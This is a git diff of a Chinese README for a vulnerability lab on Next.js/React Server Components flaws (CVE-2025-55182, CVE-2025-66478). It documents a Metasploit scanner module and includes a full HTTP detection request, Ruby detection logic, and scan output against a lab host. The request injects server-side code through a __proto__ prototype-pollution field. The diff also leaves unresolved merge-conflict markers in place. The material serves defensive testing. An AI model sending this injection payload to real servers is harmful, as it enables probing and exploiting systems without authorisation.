@@ -109,6 +109,188 @@ nmap --script=nmap-nse/nextjs-rsc-cve-2025-66478-detect.nse -p 3001 目标IP
 nmap --script=nmap-nse/*.nse -p 3000,3001 目标IP
 ```
 
+### metasploit的检测原理
+
+#### 检测载荷构造
+
+本模块发送的检测载荷结构如下：
+
+```http
+POST / HTTP/1.1
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----hxorzboundary
+
+------hxorzboundary
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'msf-test-digest'})"}}
+------hxorzboundary--
+```
+
+**关键字段解析：**
+
+1. **`Next-Action: x`**: 触发 Next.js/React Server Actions 处理流程
+2. **`Content-Type: multipart/form-data`**: RSC 载荷的必需格式
+3. **`__proto__`**: 原型链污染关键字
+4. **`_prefix` 注入**:
+   ```javascript
+   throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'msf-test-digest'})
+   ```
+   该代码强制服务器抛出包含自定义 digest 值的错误
+
+#### 漏洞检测逻辑
+
+模块通过四级判定逻辑确认漏洞状态：
+
+##### 级别 1: **确认存在漏洞** 
+```ruby
+if res.body =~ /^1:E\{.*"digest":.*\}/m
+  print_good("VULNERABLE: RSC digest exposure detected")
+end
+```
+
+**检测条件：**
+- 响应体匹配正则表达式 `/^1:E\{.*"digest":.*\}/m`
+- 响应格式示例：
+  ```
+  1:E{"digest":"msf-test-digest","message":"NEXT_REDIRECT"}
+  ```
+- **Content-Type**: `text/x-component`
+- **HTTP 状态码**: 500
+
+**判定依据：** 服务器完整反射了我们注入的 digest 值，确认存在 RSC 处理缺陷。
+
+##### 级别 2: **可能存在漏洞** 
+```ruby
+elsif res.code == 500 && res.headers['Content-Type']&.include?('text/x-component')
+  if res.body.include?('digest')
+    print_good("POTENTIALLY VULNERABLE: Unstable digest behavior")
+  end
+end
+```
+
+**检测条件：**
+- HTTP 500 错误
+- Content-Type 包含 `text/x-component`
+- 响应体包含 "digest" 关键字，但格式不标准
+
+**判定依据：** 服务器展现 RSC 相关行为，但 digest 反射不稳定，需要人工进一步验证。
+
+##### 级别 3: **检测到 RSC 通道但无 digest 反射** ℹ
+```ruby
+else
+  print_status("RSC channel detected but no digest reflection")
+end
+```
+
+**可能原因：**
+- 已打补丁的版本
+- 自定义 RSC 实现
+- 不同的错误处理配置
+
+##### 级别 4: **无漏洞迹象** 
+```ruby
+else
+  print_status("No RSC digest behavior detected")
+end
+```
+
+####  检测流程图
+
+```
+┌─────────────────────────┐
+│  发送 RSC 测试载荷      │
+└───────────┬─────────────┘
+            │
+            ▼
+┌─────────────────────────┐
+│  接收 HTTP 响应          │
+└───────────┬─────────────┘
+            │
+            ▼
+    ┌───────────────┐
+    │ 响应体匹配    │
+    │ 1:E{.*digest.*}? │
+    └───┬───────┬───┘
+        │       │
+       是│      │否
+        │       │
+        ▼       ▼
+    ┌─────┐  ┌──────────────┐
+    │确认 │  │ HTTP 500 且  │
+    │漏洞 │  │ text/x-component?│
+    └─────┘  └───┬──────┬───┘
+                 │      │
+                是│     │否
+                 │      │
+                 ▼      ▼
+         ┌───────────┐ ┌──────┐
+         │包含digest?│ │不存在│
+         └─┬─────┬───┘ └──────┘
+           │     │
+          是│    │否
+           │     │
+           ▼     ▼
+       ┌─────┐ ┌────────┐
+       │可能 │ │RSC通道 │
+       │漏洞 │ │但无反射│
+       └─────┘ └────────┘
+```
+
+### 使用方法
+
+#### 基本用法
+
+```bash
+# 启动 Metasploit
+msfconsole
+
+# 搜索模块
+msf > search rsc_digest
+
+# 加载模块
+msf > use auxiliary/scanner/http/rsc_digest_cve_2025_dual
+
+# 设置目标 IP
+msf auxiliary(...) > set RHOSTS 10.211.55.65
+
+# 设置端口（3000 用于 React2Shell，3001 用于 Next.js）
+msf auxiliary(...) > set RPORT 3000
+
+# 执行扫描
+msf auxiliary(...) > run
+```
+
+#### 参数说明
+
+| 参数 | 类型 | 默认值 | 必需 | 说明 |
+|------|------|--------|------|------|
+| `RHOSTS` | 字符串 | - | 是 | 目标主机（单IP/IP范围/文件） |
+| `RPORT` | 整数 | 3000 | 是 | 目标端口（常见：3000, 3001） |
+| `TARGETURI` | 字符串 | `/` | 是 | 测试路径（如 `/`, `/api/action`） |
+| `TIMEOUT` | 整数 | 10 | 是 | HTTP 请求超时时间（秒） |
+
+#### 实际测试结果示例
+
+```
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3000
+rport => 3000
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
+[*] Scanning 10.211.55.65:3000
+[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3000
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3001
+rport => 3001
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
+[*] Scanning 10.211.55.65:3001
+[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3001
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+
 ### Go 扫描器使用
 
 如果已构建 Go 扫描器，可直接运行：
@@ -287,6 +469,13 @@ hxorz
 
 ![](https://files.mdnice.com/user/108782/f09bdc4e-085a-41ff-97b6-5a997d6155f6.png)
 
+<<<<<<< HEAD
+=======
+# 编写metasploit模块检测截图
+
+![](https://files.mdnice.com/user/108782/68541f20-281d-4fef-acdd-a98715771ea3.jpg)
+
+>>>>>>> 95d965e (Add Metasploit RSC digest scanner for CVE-2025-55182 and CVE-2025-66478)
 # 环境说明
 
 目前仓库里**只公开了检测脚本、靶场一键搭建脚本，以及 Nuclei 的安装脚本**，所有内容都可以直接拉下来自己复现、自己验证。如果你觉得这个项目对你有用，欢迎点个 Star。
@@ -1126,5 +1315,83 @@ PORT     STATE SERVICE
 |_      further PoC validation may convert this into code execution.
 
 Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
+<<<<<<< HEAD
 (venv) hx@orz:~/1207/next_rsc_two_cves_lab$  
+=======
+(venv) hx@orz:~/1207/next_rsc_two_cves_lab$
+
+msfconsole
+Metasploit tip: You can pivot connections over sessions started with the 
+ssh_login modules
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.4.102-dev-0fd8f0984e10a135c000d1fb8797d76d62fb24f7]
++ -- --=[ 2,600 exploits - 1,329 auxiliary - 1,705 payloads     ]
++ -- --=[ 440 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search rsc_digest
+
+Matching Modules
+================
+
+   #  Name                                             Disclosure Date  Rank    Check  Description
+   -  ----                                             ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/rsc_digest_cve_2025_dual  2025-12-08       normal  No     Next.js / React RSC Digest Exposure Scanner (CVE-2025-55182 / CVE-2025-66478)
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/rsc_digest_cve_2025_dual
+
+msf > use 0
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rhost 10.211.55.65
+rhost => 10.211.55.65
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3000
+rport => 3000
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
+[*] Scanning 10.211.55.65:3000
+[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3000
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3001
+rport => 3001
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
+[*] Scanning 10.211.55.65:3001
+[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3001
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > 
+>>>>>>> 95d965e (Add Metasploit RSC digest scanner for CVE-2025-55182 and CVE-2025-66478)
 ```
